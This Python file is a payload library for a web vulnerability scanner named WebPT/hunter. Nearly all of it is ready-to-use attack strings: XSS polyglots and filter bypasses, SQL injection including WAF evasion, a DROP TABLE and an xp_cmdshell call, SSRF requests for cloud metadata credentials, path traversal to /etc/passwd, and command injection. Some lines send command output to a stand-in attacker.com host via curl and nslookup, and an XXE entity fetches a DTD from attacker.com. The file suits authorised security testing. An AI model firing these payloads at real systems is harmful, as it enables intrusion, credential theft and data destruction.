#!/usr/bin/env python3
"""
hunter_payloads.py — Complete advanced payload library for WebPT / hunter
Covers: XSS, SQLi (multi-engine), SSRF, LFI, CMDi, SSTI, Open Redirect,
        CRLF, XXE, NoSQL, GraphQL, Deserialization markers.
Includes polyglots, encoding chains, WAF/keyword bypasses, language-specific variants.
"""

from typing import List, Dict, Tuple

# =====================================================================
# XSS — polyglot, event-handler, encoding, framework, DOM
# =====================================================================
XSS_PAYLOADS: List[str] = [
    # classic
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    # polyglot (survives HTML + JS + attribute contexts)
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>",
    "'\"--></script><script>alert(1)</script>",
    # event handlers less commonly filtered
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<body onpageshow=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<video><source onerror=alert(1)>",
    "<math><mtext></math><img src=x onerror=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "\" onmouseover=alert(1) x=\"",
    # broken tags / case tricks
    "<scr<script>ipt>alert(1)</script>",
    "<svg/onload=alert(1)>",
    "<svg/onload=alert`1`>",
    # entity / encoding
    "<svg onload=alert&#40;1&#41;>",
    "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
    "<script>alert(String.fromCharCode(49))</script>",
    # alert blocked → alternative call forms
    "<svg/onload=top[atob('YWxlcnQ=')](1)>",
    "<svg/onload=window['al'+'ert'](1)>",
    "<svg/onload=Function('al'+'ert(1)')()>",
    # template / framework
    "{{constructor.constructor('alert(1)')()}}",
    "${alert(1)}",
    "#{alert(1)}",
    # DOM clobbering helper
    "<form id=x><input id=y name=z value=alert(1)></form><img src=x onerror=x.y.z>",
    # data / javascript protocol
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
]

XSS_MARKERS: List[str] = [
    "<script>alert(1)</script>", "onerror=alert(1)", "onload=alert(1)",
    "ontoggle=alert(1)", "onmouseover=alert(1)", "javascript:alert(1)",
    "alert(1)", "alert`1`", "alert&#40;1&#41;", "atob('YWxlcnQ=')",
]

# =====================================================================
# SQLi — error, boolean, union, time, stacked + engine-specific bypasses
# =====================================================================
SQLI_ERROR: List[str] = [
    "'", "\"", "')", "\");", "';--", "\\",
    "' AND 1=1--", "' AND 1=2--",
    "' OR '1'='1", "' OR '1'='2",
    "1'", "1\"", "1')", "1\")",
    "admin'--", "admin' #", "admin'/*",
    "'||'1'='1", "'&&'1'='1",
]

SQLI_UNION: List[str] = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT 1,2,3,4--",
    "' UNION ALL SELECT NULL,NULL,NULL--",
    "') UNION SELECT NULL,NULL--",
    "\" UNION SELECT NULL,NULL--",
    # WAF bypass variants
    "' UN/**/ION SELECT NULL,NULL--",
    "' UNI%00ON SELECT NULL,NULL--",
    "' %55NION SELECT NULL,NULL--",
    "' 0x554e494f4e SELECT NULL,NULL--",
]

SQLI_TIME: List[str] = [
    # MSSQL
    "'; WAITFOR DELAY '0:0:5'--",
    "';WAITFOR/**/DELAY/**/'0:0:5'--",
    # MySQL
    "' AND SLEEP(5)--",
    "' AND SLEEP(5) AND '1'='1",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "'/*!50000SLEEP(5)*/--",
    # PostgreSQL
    "'||pg_sleep(5)--",
    "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--",
    # generic
    "1' AND SLEEP(5) AND '1'='1",
    "1); WAITFOR DELAY '0:0:5'--",
]

SQLI_STACKED: List[str] = [
    "'; SELECT 1; SELECT 2--",
    "'; DROP TABLE IF EXISTS webpt_test--",
    "'; EXEC xp_cmdshell('ping 127.0.0.1')--",
]

SQLI_ERRORS_RE: List[str] = [
    r"SQL syntax.*MySQL", r"Warning.*mysql_", r"PostgreSQL.*ERROR",
    r"ORA-\d{5}", r"Microsoft OLE DB Provider for SQL Server",
    r"System\.Data\.SQLite\.SQLiteException",
    r"you have an error in your sql syntax",
    r"unclosed quotation mark", r"quoted string not properly terminated",
    r"SQLSTATE\[", r"ODBC SQL Server Driver",
    r"Microsoft SQL Native Client", r"PG::SyntaxError",
    r"sqlite3\.OperationalError",
    r"Unclosed quotation mark after the character string",
]

# =====================================================================
# SSRF — loopback, cloud metadata, encoding tricks, alternative protocols
# =====================================================================
SSRF_PAYLOADS: List[str] = [
    # classic loopback
    "http://127.0.0.1/", "http://127.0.0.1:80/", "http://127.0.0.1:8080/",
    "http://127.0.0.1:443/", "http://127.0.0.1:3000/", "http://127.0.0.1:8443/",
    "http://localhost/", "http://localhost:8080/",
    "http://[::1]/", "http://0.0.0.0/", "http://0/",
    "http://127.1/", "http://127.0.1/",
    # decimal / octal / hex
    "http://2130706433/",          # 127.0.0.1
    "http://0177.0.0.1/",
    "http://0x7f.0.0.1/",
    "http://127.0.0.1.nip.io/",
    "http://127.0.0.1.xip.io/",
    "http://localtest.me/",
    # IPv6 mapped
    "http://[0:0:0:0:0:ffff:127.0.0.1]/",
    # cloud metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/user-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://instance-data/",
    # common internals
    "http://10.0.0.1/", "http://192.168.0.1/", "http://192.168.1.1/",
    # alternative schemes (when parser allows)
    "file:///etc/passwd",
    "gopher://127.0.0.1:25/",
    "dict://127.0.0.1:11211/",
]

SSRF_MARKERS: List[str] = [
    "169.254.169.254", "ami-id", "instance-id", "root:x:0:0",
    "localhost", "127.0.0.1", "computeMetadata", "security-credentials",
    "AccessKeyId", "SecretAccessKey",
]

# =====================================================================
# LFI / Path Traversal — encoding chains, wrappers, Windows, proc
# =====================================================================
LFI_PAYLOADS: List[str] = [
    # basic
    "../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",
    "....//....//....//etc/passwd",
    # encoding
    "..%2f..%2f..%2f..%2fetc/passwd",
    "..%252f..%252f..%252f..%252fetc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd",
    # null byte (legacy PHP)
    "../../../../etc/passwd%00",
    "../../../../etc/passwd%00.jpg",
    # Windows
    "..\\..\\..\\..\\windows\\win.ini",
    "../../../../windows/win.ini",
    "..%5c..%5c..%5c..%5cwindows%5cwin.ini",
    # PHP wrappers
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=../config.php",
    "php://filter/read=string.rot13/resource=index.php",
    "php://input",
    "phar://test.phar/test.txt",
    "zip://test.zip#test.txt",
    # absolute / proc
    "/etc/passwd",
    "file:///etc/passwd",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "/proc/version",
]

LFI_MARKERS: List[str] = [
    r"root:.*:0:0:", r"\[fonts\]", r"\[extensions\]",
    r"daemon:.*:/usr/sbin", r"nobody:.*:/nonexistent",
    r"PD9waHA",  # base64 of <?php
]

# =====================================================================
# Command Injection — separators, IFS, time, OOB style
# =====================================================================
CMDI_PAYLOADS: List[str] = [
    "; id", "| id", "|| id", "& id", "&& id",
    "$(id)", "`id`",
    "; whoami", "| whoami",
    "%0aid", "%0a id", "%0a whoami",
    "'; id;'", "\"; id;\"",
    # space blocked
    ";${IFS}id", ";$IFS$id",
    # time-based
    "; sleep 5", "| sleep 5", "|| sleep 5",
    "$(sleep 5)", "`sleep 5`",
    # keyword obfuscation
    ";w`who`ami", ";w$@hoami", ";/usr/bin/id",
    ";cat$IFS/etc/passwd",
    # OOB helpers (replace attacker.com)
    "; nslookup $(whoami).attacker.com",
    "| curl http://attacker.com/$(id)",
    # Windows
    "& whoami", "&& whoami", "| whoami",
    "& ping -n 5 127.0.0.1",
]

CMDI_MARKERS: List[str] = [
    r"uid=\d+\(", r"gid=\d+\(", r"root:x:0:0", r"www-data",
    r"nt authority\\system", r"uid=0\(root\)",
]

# =====================================================================
# SSTI — multi-engine detection tuples (payload, expected)
# =====================================================================
SSTI_PAYLOADS: List[Tuple[str, str]] = [
    ("{{7*7}}", "49"),
    ("${7*7}", "49"),
    ("<%= 7*7 %>", "49"),
    ("#{7*7}", "49"),
    ("{{7*'7'}}", "7777777"),
    ("${7*'7'}", "7777777"),
    ("${{7*7}}", "49"),
    ("*{7*7}", "49"),
    ("{{config}}", "config"),
    ("{{self}}", "self"),
    ("{{request}}", "request"),
    ("#set($x=7*7)$x", "49"),
]

# =====================================================================
# Open Redirect
# =====================================================================
OPEN_REDIRECT_PAYLOADS: List[str] = [
    "//evil.com", "//evil.com/",
    "https://evil.com", "https://evil.com/",
    "http://evil.com", "http://evil.com/",
    "/\\evil.com", "\\/evil.com",
    "https:////evil.com", "https:evil.com",
    "///evil.com", "//evil.com/%2f..",
    "//evil.com\\", "////evil.com",
    "https://evil.com%2f%2f.evil.com",
    "//evil%00.com",
    "javascript:alert(1)//",
]

REDIRECT_MARKER = "evil.com"

# =====================================================================
# CRLF / Header Injection
# =====================================================================
CRLF_PAYLOADS: List[str] = [
    "%0d%0aX-Injected:%20WebPTCRLF",
    "%0aX-Injected:%20WebPTCRLF",
    "%0d%0a%20X-Injected:%20WebPTCRLF",
    "%E5%98%8A%E5%98%8DX-Injected:%20WebPTCRLF",
    "%0d%0aSet-Cookie:%20webpt=crlf",
    "%0d%0aLocation:%20https://evil.com",
]

CRLF_HEADER_NAME = "x-injected"

# =====================================================================
# XXE
# =====================================================================
XXE_PAYLOAD_LINUX = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    '<root><data>&xxe;</data></root>'
)

XXE_PAYLOAD_WINDOWS = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>'
    '<root><data>&xxe;</data></root>'
)

XXE_PAYLOAD_OOB = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd"> %xxe;]>'
    '<root><data>test</data></root>'
)

XXE_MARKERS: List[str] = [r"root:.*:0:0:", r"\[fonts\]", r"\[extensions\]"]

# =====================================================================
# NoSQL / Mongo-style
# =====================================================================
NOSQL_PAYLOADS: List[str] = [
    '{"$ne": null}',
    '{"$gt": ""}',
    '{"$ne": "nonexistent"}',
    '[{"$ne": null}]',
    '{"username": {"$ne": null}, "password": {"$ne": null}}',
    '{"$where": "1==1"}',
    '{"$regex": ".*"}',
    "true, $where: '1 == 1'",
    "admin'||'1'=='1",
]

# =====================================================================
# Deserialization markers (detection only)
# =====================================================================
DESER_MARKERS: List[str] = [
    r"java\.io\.ObjectInputStream",
    r"ysoserial",
    r"__reduce__",
    r"pickle",
    r"Marshal\.load",
]

# =====================================================================
# GraphQL introspection
# =====================================================================
GRAPHQL_INTROSPECTION: List[str] = [
    '{"query":"{__schema{types{name}}}"}',
    '{"query":"{__type(name:\\"Query\\"){name fields{name}}}"}',
]

# =====================================================================
# Family map — engine consumes this
# =====================================================================
PAYLOAD_FAMILIES: Dict[str, List] = {
    "xss": XSS_PAYLOADS,
    "sqli_error": SQLI_ERROR,
    "sqli_union": SQLI_UNION,
    "sqli_time": SQLI_TIME,
    "sqli_stacked": SQLI_STACKED,
    "ssrf": SSRF_PAYLOADS,
    "lfi": LFI_PAYLOADS,
    "cmdi": CMDI_PAYLOADS,
    "ssti": [p[0] for p in SSTI_PAYLOADS],
    "redirect": OPEN_REDIRECT_PAYLOADS,
    "crlf": CRLF_PAYLOADS,
    "xxe_linux": [XXE_PAYLOAD_LINUX],
    "xxe_windows": [XXE_PAYLOAD_WINDOWS],
    "xxe_oob": [XXE_PAYLOAD_OOB],
    "nosql": NOSQL_PAYLOADS,
    "graphql": GRAPHQL_INTROSPECTION,
}

# =====================================================================
# Quick self-test
# =====================================================================
if __name__ == "__main__":
    total = sum(len(v) for v in PAYLOAD_FAMILIES.values())
    print(f"[hunter_payloads] families={len(PAYLOAD_FAMILIES)} total_payloads={total}")
    for k, v in PAYLOAD_FAMILIES.items():
        print(f"  {k:18s} {len(v):3d}")
